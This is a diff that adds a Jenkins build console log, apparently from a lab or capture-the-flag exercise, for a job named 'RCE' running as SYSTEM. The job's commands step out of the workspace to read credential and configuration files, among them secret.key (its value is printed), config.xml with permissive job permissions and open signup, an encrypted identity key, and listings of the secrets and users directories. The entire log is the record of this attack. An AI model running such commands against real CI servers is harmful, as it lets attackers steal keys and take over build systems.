@@ -1,0 +1,120 @@
+Started by timer
+Running as SYSTEM
+Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\RCE
+[RCE] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins877363180421411301.bat
+
+C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\RCE>cmd /c powershell -c Get-Content -Path '../../secret.key' 
+ac5757641b505503f44d2752ffa01e621bf5b935763ebc8adaa2e90cf85b13ac
+
+C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\RCE>cmd /c powershell -c Get-Content -Path '../../config.xml' 
+<?xml version='1.1' encoding='UTF-8'?>
+<hudson>
+  <disabledAdministrativeMonitors>
+    <string>jenkins.diagnostics.ControllerExecutorsNoAgents</string>
+    <string>jenkins.security.QueueItemAuthenticatorMonitor</string>
+    <string>hudson.diagnosis.ReverseProxySetupMonitor</string>
+  </disabledAdministrativeMonitors>
+  <version>2.317</version>
+  <numExecutors>2</numExecutors>
+  <mode>NORMAL</mode>
+  <useSecurity>true</useSecurity>
+  <authorizationStrategy class="hudson.security.GlobalMatrixAuthorizationStrategy">
+    <permission>hudson.model.Hudson.Administer:admin</permission>
+    <permission>hudson.model.Hudson.Read:authenticated</permission>
+    <permission>hudson.model.Item.Cancel:authenticated</permission>
+    <permission>hudson.model.Item.Configure:authenticated</permission>
+    <permission>hudson.model.Item.Create:authenticated</permission>
+    <permission>hudson.model.Item.Delete:authenticated</permission>
+    <permission>hudson.model.Item.Discover:authenticated</permission>
+    <permission>hudson.model.Item.Read:authenticated</permission>
+    <permission>hudson.model.Item.Workspace:authenticated</permission>
+  </authorizationStrategy>
+  <securityRealm class="hudson.security.HudsonPrivateSecurityRealm">
+    <disableSignup>false</disableSignup>
+    <enableCaptcha>false</enableCaptcha>
+  </securityRealm>
+  <disableRememberMe>false</disableRememberMe>
+  <projectNamingStrategy class="jenkins.model.ProjectNamingStrategy$DefaultProjectNamingStrategy"/>
+  <workspaceDir>${JENKINS_HOME}/workspace/${ITEM_FULL_NAME}</workspaceDir>
+  <buildsDir>${ITEM_ROOTDIR}/builds</buildsDir>
+  <markupFormatter class="hudson.markup.EscapedMarkupFormatter"/>
+  <jdks/>
+  <viewsTabBar class="hudson.views.DefaultViewsTabBar"/>
+  <myViewsTabBar class="hudson.views.DefaultMyViewsTabBar"/>
+  <clouds/>
+  <scmCheckoutRetryCount>0</scmCheckoutRetryCount>
+  <views>
+    <hudson.model.AllView>
+      <owner class="hudson" reference="../../.."/>
+      <name>all</name>
+      <filterExecutors>false</filterExecutors>
+      <filterQueue>false</filterQueue>
+      <properties class="hudson.model.View$PropertyList"/>
+    </hudson.model.AllView>
+  </views>
+  <primaryView>all</primaryView>
+  <slaveAgentPort>-1</slaveAgentPort>
+  <label></label>
+  <crumbIssuer class="hudson.security.csrf.DefaultCrumbIssuer">
+    <excludeClientIPFromCrumb>false</excludeClientIPFromCrumb>
+  </crumbIssuer>
+  <nodeProperties/>
+  <globalNodeProperties/>
+  <nodeRenameMigrationNeeded>false</nodeRenameMigrationNeeded>
+</hudson>
+
+C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\RCE>cmd /c powershell -c Get-Content -Path '../../identity.key.enc' 
+z_5%:?t)I1›…Œ=rw"£ŸbF'æ®wX3p—U_Os*ØŒDŸo®R-¢9%�_�?-’L@I,ogƒq:o„¡?”p!A®bP=k',YdY[?1 y‰
+pjqš_™r4Dx*#,cŽ_’_S‘{	H"‚Y~u¥«:GUdy�!`-WÿOy\h¦1ŸosEA›r68’#ÿI?Dš>F:GŒc1<_+`Xöca�Uæ‹`+š«r!@Ø-U8q?Oa?Hd¤xŸ®¡Ÿ=~{U¦˜,?_?Ø+v((�AXƒ•TUu\‹3'Ot€—UUdØo)q?>%YUUøA1"iO€†8=p¢�P¥ˆ,��X.®“•”@_D1R6xY"Ý¢¥-öŸ‚M6š<]a<kIrŸeUv8�*B3A¬I’v“›.Cú­* U_@ha›II¬oEuOV—UwA?S“DO¡j“k[(#�Cá£Ž.”;_‘ñ1#‘_O'¢y_<¬q˜,U4moN?’£5>`K+—�U4.DB*V%z�«oU.QIXn'z< *?"c;BŠ‘"+>X,)‰75ŸIiœIv|,T-O9f3˜3ý>ˆ–’0"$˜?{-[œM­U6?"ON–ýæm:n.7æ6kl,ˆZÿU|1Dñ@”®Oy~6øE/6y�ªwŽ^LWªv~–OFw1‹%�ƒO�;¢asiQud
+”U�ñIOZ.›¨z•-OEI~ yA¥Xe74^§ŒTa”ˆ~D11_i¤B“o—.”MdZOsp4n(oOfCOl!b1¢rOwæ¬].€?4ZT2"1o¢‘,M"s,	'Z9!�€Pc§_YOŸ( O2,"MYU­#™?oIU$|HøŽL$Oe,OƒUi g'O�”]Ap¤•˜^s¨*“+?€Ø?1Zn„<:1öU;?=�ØOE¦Lf^kUsIW,IaI„®.t£'”8dE ör-�-/`A?_ö=O~_6p”c,7<™O_-a}QRMˆªz�R&xˆ?'_®`�<SøI˜gDI"sCpos\ö‰,IBg`z'5<Z.!O¤E"§a1‹Rbq=]¬™?."—8æ"Ezˆo?>¯Y=“8+A3O`a1uI¦]ZNc)04?Ž«Šh–ÿ*k
+K?VdL~jy_ohaJ¯_bz_Ztáöo\Ž¬yL?dS­8ETª^¢«c
+¨#qJ=­¤Y™9SL�áp-g|?,-‚.jk›8ý‡OcdE…?˜ñ¥A"Uo¢V¥-55?23T"3_Ž“…O� U§æDP…›4b;æŽ6)_„�úyqA2*?,sdDAOk-+,‰-9dc_£Eq‚	?¯->2
+qŽ>
+c!,%…®¨^œ1&sæ..??CO_‡Z¦[O?M^ ?cªAq3ZB™TawOŒy.yUA]ö+?dA?@£F‰fUirýlú8U?�\}œ€K^A{19á#BE\U�8R�XI14"h£•oøAA,=-F<ñŒ­O+_Ofq0
+eŽ­c1‰¬OEœY{O?<-‰_7úO�K+A%“O s…}jDxADO,g0mBX”>b%dŠ-{išvso¨}~ˆœ.øK|)'ŸœyyøOD•’nT%--¯ƒ>?0æUd?…•b1<O<¯OöA…�¦ø$™y1TO¬L?Š;öZOQ'\}Y„*S< $|G>€ŸIU_p?¡D¤I1B€$%?R!tk^!"o<øokÿF_ÿosA-tDEKQ%ö?oE_d:r­3Acd�4d9�i39KW<><O\_^1{•ØH‘�|7WOrJV?$TX¦1ñ?U&|�T¨3Mdxx‚?’1’,CPi<¯Q{fd�„‘]Œ~B
+ˆƒc-�-¬7iysšyY;t) Ž+o^s‰'tY”_Vr!,if+ár„!’rZ5Œ,šRý?€AOvp+^<œT'ø—-2O'8TIE-roU¡Iñ’€ýT£
+
+C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\RCE>cmd /c powershell -c Get-Content -Path '../../jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml' 
+<?xml version='1.1' encoding='UTF-8'?>
+<jenkins.security.apitoken.ApiTokenPropertyConfiguration>
+  <tokenGenerationOnCreationEnabled>false</tokenGenerationOnCreationEnabled>
+  <creationOfLegacyTokenEnabled>false</creationOfLegacyTokenEnabled>
+  <usageStatisticsEnabled>true</usageStatisticsEnabled>
+</jenkins.security.apitoken.ApiTokenPropertyConfiguration>
+
+C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\RCE>cmd /c powershell -c ls '../../secrets' 
+
+
+    Directory: C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       10/20/2021  10:08 PM                filepath-filters.d                                                    
+d-----       10/20/2021  10:08 PM                whitelisted-callables.d                                               
+-a----       10/20/2021  10:26 PM            272 hudson.console.AnnotatedLargeText.consoleAnnotator                    
+-a----       10/20/2021  10:26 PM             32 hudson.model.Job.serverCookie                                         
+-a----       10/20/2021  10:15 PM            272 hudson.util.Secret                                                    
+-a----       10/20/2021  10:08 PM             32 jenkins.model.Jenkins.crumbSalt                                       
+-a----       10/20/2021  10:08 PM            256 master.key                                                            
+-a----       10/20/2021  10:08 PM            272 org.jenkinsci.main.modules.instance_identity.InstanceIdentity.KEY     
+-a----       10/20/2021  10:21 PM              5 slave-to-master-security-kill-switch                                  
+
+
+
+C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\RCE>cmd /c powershell -c ls '../../users' 
+
+
+    Directory: C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       10/21/2021   2:22 AM                admin_17207690984073220035                                            
+d-----        2/16/2023   2:41 AM                badadmin_73470202950748431                                            
+-a----        2/16/2023   2:41 AM            408 users.xml                                                             
+
+
+
+C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\RCE>exit 0 
+Finished: SUCCESS
